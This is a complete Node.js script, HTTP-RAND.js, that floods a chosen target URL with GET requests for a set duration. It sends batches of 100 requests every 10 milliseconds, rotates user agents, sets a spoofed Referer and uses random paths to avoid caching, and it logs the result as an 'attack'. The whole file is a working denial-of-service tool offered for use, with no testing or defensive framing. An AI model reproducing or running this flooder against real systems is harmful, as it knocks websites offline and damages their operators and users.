const fs = require('fs');
const https = require('https');
const http = require('http');
const { URL } = require('url');

if (process.argv.length < 5) {
    console.log('Usage: node HTTP-RAND.js <target> <time> <useragents.txt>');
    process.exit(1);
}
const target = process.argv[2];
const time = parseInt(process.argv[3]);
const uaFile = process.argv[4];
let userAgents = [];
try {
    userAgents = fs.readFileSync(uaFile, 'utf-8').split('\n').map(ua => ua.trim()).filter(ua => ua && /^[\x20-\x7E]+$/.test(ua));
} catch (e) {
    userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)'];
}
const stop = Date.now() + time * 1000;
let success = 0, fail = 0, statusCounter = {};
function randomPath() {
    return '/' + Math.random().toString(36).substring(2, 10) + '/' + Math.random().toString(36).substring(2, 10);
}
function sendRequest() {
    if (Date.now() > stop) {
        console.log(`[INFO] Attack finished. Success: ${success} | Fail: ${fail} | Status codes:`, statusCounter);
        process.exit(0);
    }
    for (let i = 0; i < 100; i++) {
        const url = new URL(target);
        const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: randomPath(),
            method: 'GET',
            headers: {
                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Referer': target
            }
        };
        const reqModule = url.protocol === 'https:' ? https : http;
        const req = reqModule.request(options, res => {
            statusCounter[res.statusCode] = (statusCounter[res.statusCode] || 0) + 1;
            success++;
            console.log(`[SUCCESS] Status: ${res.statusCode}`);
        });
        req.on('error', err => {
            fail++;
            console.log(`[FAIL] Error: ${err.code}`);
        });
        req.end();
    }
}
setInterval(sendRequest, 10);
